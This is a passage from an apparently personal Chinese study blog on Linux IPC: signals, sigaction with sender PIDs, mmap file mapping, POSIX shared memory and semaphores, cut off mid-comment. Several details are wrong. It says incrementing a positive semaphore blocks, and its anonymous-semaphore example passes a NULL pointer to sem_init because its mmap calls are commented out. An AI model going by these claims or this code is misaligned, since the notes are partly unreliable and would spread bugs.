<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sigemptyset</span>(<span class="type">sigset_t</span> *set);             <span class="comment">//：信号集全部清0；</span></span><br><span class="line"><span class="built_in">sigfillset</span>(<span class="type">sigset_t</span> *set);              <span class="comment">//： 信号集全部置1，则信号集包含linux支持的64种信号；</span></span><br><span class="line"><span class="built_in">sigaddset</span>(<span class="type">sigset_t</span> *set, <span class="type">int</span> signum);   <span class="comment">//：向信号集中加入signum信号；</span></span><br><span class="line"><span class="built_in">sigdelset</span>(<span class="type">sigset_t</span> *set, <span class="type">int</span> signum);   <span class="comment">//：向信号集中删除signum信号；</span></span><br><span class="line"><span class="built_in">sigismember</span>(<span class="type">const</span> <span class="type">sigset_t</span> *set, <span class="type">int</span> signum);<span class="comment">//：判定信号signum是否存在信号集中</span></span><br></pre></td></tr></table></figure>
<h3 id="如何发送信号">如何发送信号</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span>()：用于向进程或进程组发送信号；</span><br><span class="line"><span class="built_in">sigqueue</span>()：只能向一个进程发送信号，不能像进程组发送信号；主要针对实时信号提出，与<span class="built_in">sigaction</span>()组合使用，当然也支持非实时信号的发送；</span><br><span class="line"><span class="built_in">alarm</span>()：用于调用进程指定时间后发出SIGALARM信号；</span><br><span class="line"><span class="built_in">setitimer</span>()：设置定时器，计时达到后给进程发送SIGALRM信号，功能比alarm更强大；</span><br><span class="line"><span class="built_in">abort</span>()：向进程发送SIGABORT信号，默认进程会异常退出。</span><br><span class="line"><span class="built_in">raise</span>()：用于向进程自身发送信号</span><br></pre></td></tr></table></figure>
<h2 id="示范">示范</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 4100</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">signal_handler</span><span class="params">(<span class="type">int</span> signum, <span class="type">siginfo_t</span> *info, <span class="type">void</span> *context)</span> </span>&#123;           <span class="comment">// 得到相应发送信号的进程号</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Received signal %d from process %ld\n&quot;</span>, signum, (<span class="type">long</span>)info-&gt;si_pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sig_haha</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fuck\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line">    sa.sa_flags = SA_SIGINFO;</span><br><span class="line">  <span class="comment">//sa.sa_sigaction = signal_handler;</span></span><br><span class="line">  sa.sa_handler = sig_haha;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sigaction</span>(<span class="number">3</span> , &amp;sa, <span class="literal">NULL</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;sigaction&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">      <span class="type">pid_t</span> father_pid = <span class="built_in">getpid</span>();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,father_pid);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1</span>;i++)&#123;</span><br><span class="line">          id = fork();</span><br><span class="line">    <span class="keyword">if</span>(id != <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(id != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,father_pid);</span></span><br><span class="line">    <span class="built_in">kill</span>(father_pid,<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//  进行处理</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for a signal</span></span><br><span class="line">      <span class="built_in">pause</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2
id="接受信号的进程如何查看发送方的pid">接受信号的进程如何查看发送方的pid</h2>
<p>接受信号的一方可以通过回调函数查看发送信号的进程pid，这种方法使得进程可以使用信号互相交流，而不是单方面的传递信息。<br />
关键点是使用<code>sa_sigaction</code>接收函数。 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">signal_handler</span><span class="params">(<span class="type">int</span> signum, <span class="type">siginfo_t</span> *info, <span class="type">void</span> *context)</span> </span>&#123;           <span class="comment">// 得到相应发送信号的进程号</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Received signal %d from process %ld\n&quot;</span>, signum, (<span class="type">long</span>)info-&gt;si_pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line">    sa.sa_flags = SA_SIGINFO;</span><br><span class="line">  sa.sa_sigaction = signal_handler;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sigaction</span>(<span class="number">3</span> , &amp;sa, <span class="literal">NULL</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;sigaction&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">      <span class="type">pid_t</span> father_pid = <span class="built_in">getpid</span>();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,father_pid);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1</span>;i++)&#123;</span><br><span class="line">          id = fork();</span><br><span class="line">    <span class="keyword">if</span>(id != <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(id != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,father_pid);</span></span><br><span class="line">    <span class="built_in">kill</span>(father_pid,<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//  进行处理</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for a signal</span></span><br><span class="line">      <span class="built_in">pause</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="共享内存">共享内存</h1>
<p><a
href="https://blog.csdn.net/modi000/article/details/125040478">两种共享内存的机制</a><br />
<a href="http://blog.jqian.net/post/linux-shm.html">两种共享内存</a> <a
href="https://blog.csdn.net/daiyudong2020/article/details/50500651">文件映射和共享内存</a>
<a
href="https://blog.csdn.net/sculpta/article/details/105923513">多进程使用文件映射实现共享内存功能</a>
现代linux中存在两种共享内存的机制 1.
POSIX共享内存<code>(shm_open()、shm_unlink())</code>，需要结合<code>mmap</code>使用
2. System V共享内存<code>(shmget()、shmat()、shmdt())</code></p>
<p>两种机制都能实现共享内存的基本功能，区别在于 1. System
V共享内存是持久的，如果程序中不进行明确的删除则会永久留在内存里，知道系统关机
2.
mmap映射的内存在不是持久化的，假如进程关闭，映射随即失效，除非事前已经映射到了一个文件上。</p>
<h2 id="如何创建共享内存和文件映射">如何创建共享内存和文件映射</h2>
<p><img src="sss.png" alt="共享内存和文件映射的创建" /><br />
1.
内存映射文件，由open函数返回文件描述符，再由mmap将文件映射到当前进程空间地址中的文件。多个进程可对一个文件进行映射，可进行进程间的通信。<a
href="https://blog.csdn.net/sculpta/article/details/105923513">文件映射实现进程间通讯</a></p>
<p>具体的设置还得看代码才能理解，这里对代码进行注释，给出各个参数的含义
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;./input&quot;</span>,O_RDWR,<span class="number">0777</span>);</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">lseek</span>(fd,<span class="number">0</span>,SEEK_END);   </span><br><span class="line">    <span class="comment">// 所有文件打开都有一个文件偏移量(cfo, current file offset)，表示文件开头到当前读写位置的字节数，是一个非负整数。所有文件读写都从cfo开始,每次读写都会使cfo增大读写字节数，    </span></span><br><span class="line">    <span class="comment">// off_t lseek(int fd, off_t offset, int whence);</span></span><br><span class="line">    <span class="comment">// offset设置打开的文件偏移位置，返回值是指针相对于文件开头的偏移量，也就是移动后的指针位置。</span></span><br><span class="line">    <span class="comment">// whence 表示偏移量相对哪里来说，用于表示offset的处理方式</span></span><br><span class="line">    <span class="comment">//      1. SEEK_END表示，文件偏移量cfo = 文件总长度 + offset</span></span><br><span class="line">    <span class="comment">//      2. SEEK_CUR表示，文件偏移量cfo = 当前文件偏移量 + offset</span></span><br><span class="line">    <span class="comment">//      3. SEEK_SET表示，文件偏移量cfo = offset</span></span><br><span class="line">    <span class="type">char</span> *buffer1 = (<span class="type">char</span> *)<span class="built_in">mmap</span>(<span class="literal">NULL</span>, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//       void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);</span></span><br><span class="line">    <span class="comment">// 1. addr是一个映射地址，这个地址只是建议内核这么做，内核具体做法要经过实际判断（如当前位置是否存在映射、是否为页边界等）给出映射地址，如果为NULL的话，则内核自行分配映射地址。</span></span><br><span class="line">    <span class="comment">// 2. length和offset表示了文件映射范围，设开始处为0，那么映射范围为[offset, offset + length], offset必须为页大小的整数倍</span></span><br><span class="line">    <span class="comment">// 3. prot 表示映射区的保护方式，即可对映射区域做怎样的操作，有如下选项</span></span><br><span class="line">    <span class="comment">//      1. PROT_EXEC： 映射区可被执行</span></span><br><span class="line">    <span class="comment">//      2. PROT_READ： 映射区可被读取</span></span><br><span class="line">    <span class="comment">//      3. PROT_WRITE： 映射区可被写入</span></span><br><span class="line">    <span class="comment">//      4. PROT_NONE： 映射区不能存取</span></span><br><span class="line">    <span class="comment">// 4. flag表示映射区域的特性</span></span><br><span class="line">    <span class="comment">//      1. MAP_SHARED： 对映射区域的写入数据会复制回文件, 且允许其他映射该文件的进程共享</span></span><br><span class="line">    <span class="comment">//      2. MAP_PRIVATE： 对映射区域的写入操作会产生一个映射的复制(copy-on-write), 对此区域所做的修改不会写回原文件。</span></span><br><span class="line">    <span class="comment">// 5. fd： 由open返回的文件描述符, 代表要映射的文件</span></span><br><span class="line">    <span class="comment">// 函数失败返回-1 MAP_FAILED( (void *) -1),成功返回映射区域</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;first = %s\n&quot;</span>,buffer1);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;second = %s\n&quot;</span>,buffer1);</span><br><span class="line">    <span class="built_in">munmap</span>(buffer1,len);    <span class="comment">// 为防止内存泄漏，应手动将映射释放掉, 成功返回0，失败返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;./input&quot;</span>,O_RDWR,<span class="number">0777</span>);</span><br><span class="line">  <span class="type">char</span> data[<span class="number">100</span>] = <span class="string">&quot;safssajhfjasfhgjsdgj&quot;</span>;</span><br><span class="line">  <span class="built_in">lseek</span>(fd,(<span class="built_in">strlen</span>(data) - <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>),SEEK_END);</span><br><span class="line">  <span class="built_in">write</span>(fd, <span class="string">&quot; &quot;</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="type">char</span> *buffer1 = (<span class="type">char</span> *)<span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="built_in">strlen</span>(data) * <span class="built_in">sizeof</span>(<span class="type">char</span>), PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer1,data,<span class="built_in">strlen</span>(data) * <span class="built_in">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    <span class="built_in">munmap</span>(buffer1, <span class="built_in">strlen</span>(data) * <span class="built_in">sizeof</span>(<span class="type">char</span> ));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123; </span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;创建进程出错\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(pid == <span class="number">0</span>)<span class="built_in">read_</span>();</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">write_</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure> 输出为 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">$ ./a.out                                                                           [21:07:00]</span><br><span class="line">first =</span><br><span class="line"></span><br><span class="line">second = safssajhfjasfhgjsdgj</span><br></pre></td></tr></table></figure>
可以看到通过对文件的映射，可以实现两个进程的内存间的通信</p>
<ol start="2" type="1">
<li>共享内存
实现方法和上面依旧一样，只不过将<code>open</code>函数使用<code>shm_open</code>代替,
并且存在一些注意的点</li>
</ol>
<ul>
<li>mmap映射长度必须大于一个页大小，否则会出现bus error</li>
<li>A、B两进程都是用同一共享内存，但A进程将内存munmap后B进程依旧可以使用。可见下代码</li>
<li>由于mmap不能改变文件大小，所以最初文件大小应使用ftruncate(fd,length)进行设定</li>
<li>映射文件名不能带有路径，如"./input"或"/home/skt1faker/ff",只能为"input",
原因与tmpfs文件系统有关，tmpfs将所有文件放在虚拟内存中，并不放在磁盘上，在实现POSIX共享内存时，会预设tmpfs文件系统挂载在/dev/shm/，<code>open_shm</code>实现时<code>open_shm</code>给出的文件路径和<code>/dev/shm</code>进行拼接，所以给出<code>open_shm</code>中的文件名路径应为相对路径，并且在/dev/shm下。如<code>shm_open("./haha/sss",O_CREAT|O_TRUNC|O_RDWR,0777);</code>必须存在<code>/dev/shm/haha</code></li>
<li>共享内存使用链接库rt，编译选项中加入-lrt即可</li>
<li><code>O_TRUNC</code>选项只在创建共享内存文件时使用，如果打开则不可使用此选项，会造成打开前其他进程写入内容的清空</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 4100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译链接库为-lrt</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 1. 文件名不可为input</span></span><br><span class="line">  <span class="comment">// 2. O_TRUNC表示将打开文件的内容清空</span></span><br><span class="line">  <span class="comment">// 3. O_CREAT表示文件不存在时将文件创建。</span></span><br><span class="line">  <span class="comment">// 4. O_RDWR表示文件读写</span></span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1</span>);       <span class="comment">// 等待写文件打开共享内存</span></span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">shm_open</span>(<span class="string">&quot;input&quot;</span>,O_CREAT|O_RDWR,<span class="number">0777</span>);       <span class="comment">// O_TRUNC 会将文件清空，后打开的共享内存文件尽量不要将文件清空，因为可能会造成之前其他进程写入内容消失。</span></span><br><span class="line">  <span class="type">int</span> len = LEN;   </span><br><span class="line">  <span class="comment">// 用于共享内存的mmap中，length值应大于一个页的大小,即至少为4096</span></span><br><span class="line">  <span class="type">char</span> *buffer1 = (<span class="type">char</span> *)<span class="built_in">mmap</span>(<span class="literal">NULL</span>, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;first = %s\n&quot;</span>,buffer1);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">3</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;second = %s\n&quot;</span>,buffer1);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">munmap</span>(buffer1,len) != <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read munmap\n&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">shm_open</span>(<span class="string">&quot;input&quot;</span>,O_CREAT|O_TRUNC|O_RDWR,<span class="number">0777</span>);</span><br><span class="line">  <span class="type">char</span> data[LEN] = <span class="string">&quot;safssajhfjasfhgjsdgj&quot;</span>;   <span class="comment">// 大小为页的整数被，否则会出现bus error</span></span><br><span class="line">  <span class="built_in">ftruncate</span>(fd, <span class="built_in">sizeof</span>(data));                <span class="comment">// 修改文件大小</span></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="type">char</span> *buffer1 = (<span class="type">char</span> *)<span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(data), PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(buffer1,data,<span class="built_in">strlen</span>(data));</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">munmap</span>(buffer1, <span class="built_in">sizeof</span>(data)) != <span class="number">-1</span>)   <span class="comment">// 可以，munmap，munmap后其他进程依旧可以访问</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write munmap\n&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123; </span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;创建进程出错\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(pid != <span class="number">0</span>)<span class="built_in">read_</span>();</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">write_</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序输出为 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">$ gcc a.cpp -g -o <span class="built_in">test</span> -lrt &amp;&amp; ./test</span><br><span class="line">first =</span><br><span class="line">write munmap</span><br><span class="line">second = safssajhfjasfhgjsdgj</span><br><span class="line"><span class="built_in">read</span> munmap</span><br><span class="line">(homework)</span><br></pre></td></tr></table></figure></p>
<h1 id="信号量">信号量</h1>
<p><a href="https://zhuanlan.zhihu.com/p/649647971">参考</a> <a
href="https://www.jianshu.com/p/ee5bb8948dc0">共享内存和信号量实现同步</a></p>
<h2 id="工作方式">工作方式</h2>
<p>信号量作用为同步，而不是传递信息，信号的工作方式如下： 1.
当信号量值为0时，试图对信号量-1的进程会阻塞 2.
当信号量大于0时，试图对信号量+1的进程会阻塞</p>
<p>主要使用三种函数：<br />
1. <code>int sem_wait(sem_t *sem)</code>： -
如果信号量值<code>*sem &gt; 0</code>，则<code>sem_wait</code>会立即返回,
并将<code>*sem - 1</code>。 -
如果<code>*sem == 0</code>，则<code>sem_wait()</code>会阻塞至信号量大于0。
- 返回值0表示成功，-1表示失败</p>
<ol start="2" type="1">
<li><code>int sem_post(sem_t *sem)</code>：</li>
</ol>
<ul>
<li>以原子操作的形式将信号量值+1</li>
<li>返回值0表示成功，-1表示失败</li>
</ul>
<ol start="3" type="1">
<li><code>int sem_destory(sem_t * sem);</code>：</li>
</ol>
<ul>
<li>该函数对用完的信号量进行清理</li>
<li>返回值成功为0，失败为-1；</li>
</ul>
<h2 id="创建方法">创建方法</h2>
<p>进程间使用信号量通讯有两种方式 1. 匿名信号量<br />
匿名信号量使用共享内存实现，利用mmap生成一个文件映射或者匿名映射（对应参数中<code>fd = -1</code>，或<code>fd = open("/dev/zero",O_RDWR)</code>）。生成的信号量使用<code>sem_init</code>初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sem_init</span><span class="params">(<span class="type">sem_t</span> *sem, <span class="type">int</span> pshared, <span class="type">unsigned</span> <span class="type">int</span> value)</span></span>;</span><br><span class="line"><span class="comment">// pshared表示信号量在进程内（线程间）使用还是进程间使用。</span></span><br><span class="line"><span class="comment">// sem为匿名信号量地址</span></span><br></pre></td></tr></table></figure>
<p>具体创建方式 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">sem_t</span> *sem_id = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  // 不知应不应改算匿名信号量</span></span><br><span class="line"><span class="comment">  int fd = open(&quot;./input&quot;,o_rdwr,0777);</span></span><br><span class="line"><span class="comment">  sem_id = (sem_t *)mmap(null, sizeof(sem_t), prot_read | prot_write, map_shared | map_anonymous, fd, 0);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  // 匿名信号量</span></span><br><span class="line"><span class="comment">  int fd = open(&quot;/dev/zero&quot;,o_rdwr);</span></span><br><span class="line"><span class="comment">  sem_id = (sem_t *)mmap(null, sizeof(sem_t), prot_read | prot_write, map_shared | map_anonymous, fd, 0);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// 匿名信号量</span></span><br><span class="line">  <span class="comment">//sem_id = (sem_t *)mmap(null, sizeof(sem_t), prot_read | prot_write, map_shared | map_anonymous, -1, 0);</span></span><br><span class="line">  <span class="built_in">sem_init</span>(sem_id, <span class="number">1</span>, <span class="number">1</span>);   <span class="comment">/// 匿名信号量初始化</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);     <span class="comment">// -- 1</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Parent Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == -pid) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Child Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);   <span class="comment">// -- 2</span></span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
注意<code>MAP_SHARED</code>表示多个进程共享的标记</p>
<ol start="2" type="1">
<li>命名信号量</li>
</ol>
<p>命名信号量使用<code>sem_open</code>，如同打开文件一样，打开信号量。可用于创建一个信号量或打开一个已有的信号量。
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>           <span class="comment">/* For O_* constants */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>        <span class="comment">/* For mode constants */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">sem_t</span> *<span class="title">sem_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> oflag)</span></span>;</span><br><span class="line"><span class="function"><span class="type">sem_t</span> *<span class="title">sem_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> oflag,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">mode_t</span> mode, <span class="type">unsigned</span> <span class="type">int</span> value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     name 表示信号量名字，多个进程使用同一个信号量需要将信号量名字统一。</span></span><br><span class="line"><span class="comment">     